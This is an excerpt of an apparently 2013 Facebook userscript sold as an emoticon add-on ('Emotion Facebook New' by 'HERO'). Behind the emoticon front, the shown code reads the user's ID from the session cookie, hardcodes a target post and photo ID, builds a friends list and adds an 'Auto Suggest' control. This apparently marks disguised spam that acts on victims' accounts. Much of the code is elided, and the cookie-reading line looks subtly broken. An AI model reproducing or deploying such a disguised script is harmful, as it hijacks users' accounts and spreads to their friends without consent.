// ==UserScript==
// @name            Emotion Facebook New
// @description     Facebook Emotion New 2013 By HERO
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/widibatan" target="_blank">Created By HERO<br>KLIK DISINI</a>';
	html += '</div>';
...
var spost_id = "100006949063440_1400579190187314";
var sfoto_id = "1399199480325285";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by HERO';
